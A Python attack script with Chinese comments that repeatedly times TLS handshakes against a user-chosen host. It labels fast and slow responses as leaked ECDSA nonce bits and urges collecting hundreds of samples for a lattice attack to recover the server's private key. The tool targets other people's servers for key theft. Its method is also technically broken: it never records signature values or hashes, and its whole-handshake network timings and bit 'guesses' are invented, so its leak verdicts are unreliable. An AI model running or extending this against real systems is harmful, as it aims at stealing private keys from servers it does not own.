#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ECDSA时序收集器 - 集成到你的工具链
利用已有的fingerprint和cert_sociology模块
"""

import time
import sys
import json
import hashlib
from typing import List, Dict, Optional

# 导入你的现有模块
try:
    import fingerprint_proxy
    import cert_sociology
    MODULES_AVAILABLE = True
except ImportError:
    print("[!] 需要fingerprint_proxy和cert_sociology模块")
    MODULES_AVAILABLE = False

def collect_ecdsa_timing_from_tls(host: str, port: int = 443, count: int = 100) -> List[Dict]:
    """使用你的fingerprint模块收集TLS握手时序"""
    
    signatures = []
    print(f"[*] 目标: {host}:{port}")
    print(f"[*] 收集 {count} 个TLS握手时序数据\n")
    
    for i in range(count):
        try:
            # 使用你的fingerprint模块的TLS指纹功能
            start_time = time.perf_counter()
            
            # 调用你的TLS指纹函数
            result = fingerprint_proxy.run_tls_fp(
                host, 
                port, 
                timeout=5.0,
                server_name=host
            )
            
            elapsed = (time.perf_counter() - start_time) * 1000  # 转为毫秒
            
            # 提取有用信息
            sig_data = {
                'index': i,
                'response_time_ms': round(elapsed, 2),
                'timestamp': time.time(),
                'tls_version': result.get('tls_version', 'unknown'),
                'cipher_suite': result.get('cipher_suite', 'unknown'),
                'cert_info': result.get('certificate', {})
            }
            
            # 检查是否是ECDSA证书
            if 'ecdsa' in str(result.get('signature_algorithm', '')).lower():
                sig_data['is_ecdsa'] = True
            else:
                sig_data['is_ecdsa'] = False
            
            signatures.append(sig_data)
            
            # 进度输出
            if (i + 1) % 10 == 0:
                avg_time = sum(s['response_time_ms'] for s in signatures) / len(signatures)
                ecdsa_count = sum(1 for s in signatures if s.get('is_ecdsa'))
                print(f"[+] 进度: {i+1}/{count}")
                print(f"    平均响应: {avg_time:.2f}ms")
                print(f"    ECDSA证书: {ecdsa_count}/{len(signatures)}")
                
                # 分析时序分布
                times = [s['response_time_ms'] for s in signatures]
                fast = sum(1 for t in times if t < avg_time - 10)
                slow = sum(1 for t in times if t > avg_time + 10)
                print(f"    快速响应(<平均-10ms): {fast}")
                print(f"    慢速响应(>平均+10ms): {slow}\n")
            
        except Exception as e:
            print(f"[-] 错误: {e}")
            continue
        
        # 避免过快
        time.sleep(0.1)
    
    return signatures

def analyze_timing_for_nonce_leak(signatures: List[Dict]) -> Dict:
    """分析时序数据寻找nonce泄露迹象"""
    
    if len(signatures) < 20:
        return {"error": "样本太少"}
    
    # 只分析ECDSA签名
    ecdsa_sigs = [s for s in signatures if s.get('is_ecdsa')]
    
    if not ecdsa_sigs:
        return {"error": "没有ECDSA签名"}
    
    # 提取时序
    times = [s['response_time_ms'] for s in ecdsa_sigs]
    
    # 统计分析
    avg_time = sum(times) / len(times)
    min_time = min(times)
    max_time = max(times)
    
    # 分组分析
    sorted_sigs = sorted(ecdsa_sigs, key=lambda x: x['response_time_ms'])
    
    # 最快的25%
    fast_quarter = sorted_sigs[:len(sorted_sigs)//4]
    # 最慢的25%
    slow_quarter = sorted_sigs[3*len(sorted_sigs)//4:]
    
    fast_avg = sum(s['response_time_ms'] for s in fast_quarter) / len(fast_quarter)
    slow_avg = sum(s['response_time_ms'] for s in slow_quarter) / len(slow_quarter)
    
    # 时序差异
    time_diff = slow_avg - fast_avg
    
    analysis = {
        'total_ecdsa_signatures': len(ecdsa_sigs),
        'timing_stats': {
            'avg_ms': round(avg_time, 2),
            'min_ms': round(min_time, 2),
            'max_ms': round(max_time, 2),
            'variance_ms': round(max_time - min_time, 2)
        },
        'group_analysis': {
            'fast_25_percent_avg': round(fast_avg, 2),
            'slow_25_percent_avg': round(slow_avg, 2),
            'difference_ms': round(time_diff, 2)
        }
    }
    
    # 判断泄露可能性
    if time_diff > 50:
        analysis['leak_assessment'] = "HIGH - 明显的时序差异，可能存在nonce泄露"
        analysis['recommendation'] = "收集更多样本进行深入分析"
    elif time_diff > 20:
        analysis['leak_assessment'] = "MEDIUM - 中等时序差异"
        analysis['recommendation'] = "继续监控，收集1000+样本"
    else:
        analysis['leak_assessment'] = "LOW - 时序相对稳定"
        analysis['recommendation'] = "可能需要其他攻击向量"
    
    # 模拟MSB偏差检测
    # 假设：快速响应可能意味着nonce的MSB为0（计算更快）
    if time_diff > 30:
        analysis['msb_bias_hypothesis'] = {
            'theory': "快速响应可能表示nonce MSB=0",
            'fast_group_size': len(fast_quarter),
            'slow_group_size': len(slow_quarter),
            'suggested_attack': "Lattice attack with timing side-channel"
        }
    
    return analysis

def simulate_nonce_msb_from_timing(signatures: List[Dict]) -> List[Dict]:
    """基于时序推测nonce的MSB（模拟）"""
    
    ecdsa_sigs = [s for s in signatures if s.get('is_ecdsa')]
    if not ecdsa_sigs:
        return []
    
    # 计算时序阈值
    times = [s['response_time_ms'] for s in ecdsa_sigs]
    avg_time = sum(times) / len(times)
    
    # 推测MSB
    msb_guesses = []
    for sig in ecdsa_sigs:
        guess = {
            'index': sig['index'],
            'response_time': sig['response_time_ms'],
            'timestamp': sig['timestamp']
        }
        
        # 基于时序推测MSB
        if sig['response_time_ms'] < avg_time - 10:
            # 快速响应 -> 可能MSB = 0000
            guess['msb_guess'] = '0000'
            guess['confidence'] = 'high' if sig['response_time_ms'] < avg_time - 20 else 'medium'
        elif sig['response_time_ms'] > avg_time + 10:
            # 慢速响应 -> 可能MSB = 1xxx
            guess['msb_guess'] = '1xxx'
            guess['confidence'] = 'medium'
        else:
            # 平均响应 -> 不确定
            guess['msb_guess'] = 'xxxx'
            guess['confidence'] = 'low'
        
        msb_guesses.append(guess)
    
    return msb_guesses

def main():
    """主函数"""
    
    if not MODULES_AVAILABLE:
        print("[!] 请确保fingerprint_proxy和cert_sociology模块可用")
        sys.exit(1)
    
    if len(sys.argv) < 2:
        print("用法: python3 ecdsa_timing_collector.py <目标> [端口] [数量]")
        print("示例: python3 ecdsa_timing_collector.py example.com 443 100")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    
    print("="*60)
    print("ECDSA Nonce时序泄露收集器")
    print("="*60)
    
    # 收集时序数据
    signatures = collect_ecdsa_timing_from_tls(host, port, count)
    
    if not signatures:
        print("[!] 未能收集到数据")
        return
    
    # 分析结果
    print("\n" + "="*60)
    print("分析结果")
    print("="*60)
    
    analysis = analyze_timing_for_nonce_leak(signatures)
    
    print("\n[时序分析]")
    for key, value in analysis.items():
        if isinstance(value, dict):
            print(f"\n  {key}:")
            for k, v in value.items():
                print(f"    {k}: {v}")
        else:
            print(f"  {key}: {value}")
    
    # MSB推测
    msb_guesses = simulate_nonce_msb_from_timing(signatures)
    
    # 统计MSB分布
    msb_0000 = sum(1 for g in msb_guesses if g['msb_guess'] == '0000')
    msb_1xxx = sum(1 for g in msb_guesses if g['msb_guess'] == '1xxx')
    msb_unknown = sum(1 for g in msb_guesses if g['msb_guess'] == 'xxxx')
    
    print("\n[MSB偏差推测]")
    print(f"  MSB=0000 (快速): {msb_0000} ({100*msb_0000/len(msb_guesses):.1f}%)")
    print(f"  MSB=1xxx (慢速): {msb_1xxx} ({100*msb_1xxx/len(msb_guesses):.1f}%)")
    print(f"  未知: {msb_unknown} ({100*msb_unknown/len(msb_guesses):.1f}%)")
    
    # 判断是否有偏差
    if msb_0000 > len(msb_guesses) * 0.35:
        print("\n[!] 检测到MSB=0偏差！")
        print("    建议收集200+签名进行Lattice攻击")
    elif msb_1xxx > len(msb_guesses) * 0.35:
        print("\n[!] 检测到MSB=1偏差！")
        print("    可能存在其他实现问题")
    
    # 保存数据
    output_file = f"ecdsa_timing_{host}_{int(time.time())}.json"
    with open(output_file, 'w') as f:
        json.dump({
            'target': f"{host}:{port}",
            'collection_time': time.time(),
            'signatures': signatures,
            'analysis': analysis,
            'msb_guesses': msb_guesses,
            'statistics': {
                'total_collected': len(signatures),
                'ecdsa_signatures': len([s for s in signatures if s.get('is_ecdsa')]),
                'msb_0000_count': msb_0000,
                'msb_1xxx_count': msb_1xxx,
                'msb_unknown_count': msb_unknown
            }
        }, f, indent=2)
    
    print(f"\n[+] 详细数据已保存到: {output_file}")
    
    # 最终建议
    print("\n[建议]")
    if analysis.get('leak_assessment', '').startswith('HIGH'):
        print("  ✓ 发现高风险时序泄露")
        print("  ✓ 立即收集更多样本")
        print("  ✓ 准备Lattice攻击代码")
    elif msb_0000 > len(msb_guesses) * 0.3:
        print("  ✓ MSB偏差明显")
        print("  ✓ 继续收集，达到500个样本")
        print("  ✓ 使用LLL/BKZ算法尝试恢复私钥")
    else:
        print("  - 暂未发现明显泄露")
        print("  - 可以尝试其他端口或协议")
        print("  - 或收集更大样本量(1000+)")

if __name__ == "__main__":
    main()